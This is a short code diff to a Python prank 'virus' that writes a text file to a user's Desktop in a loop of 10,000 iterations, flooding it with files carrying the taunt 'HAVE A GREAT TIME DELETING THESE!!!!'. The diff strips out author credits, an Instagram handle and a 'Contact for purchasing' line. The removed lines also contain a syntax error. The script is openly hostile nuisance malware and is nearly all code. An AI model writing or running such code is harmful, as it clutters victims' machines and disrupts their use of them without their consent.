@@ -9,11 +9,8 @@ def replicating ():
     username = fr'{username}\Desktop\{filename}.txt'
 
     with open(username, 'w') as file1:
-        file1.write('HAVE A GREAT TIME DELETING THESE!!!! HUEHUEHUEHUE\n')
-        file1.write(       'Virus made by:-\n')
-        file1.write(        'Jap® and Jas®   (Patent Pending...)\n')
-        file1.write(        'Instagram : @arorajas99      https://www.instagram.com/arorajas99/\n'
-        file1.write("                   Contact for purchasing")
+        file1.write('HAVE A GREAT TIME DELETING THESE!!!!')
+    
 
 for i in range (10000):
     replicating()
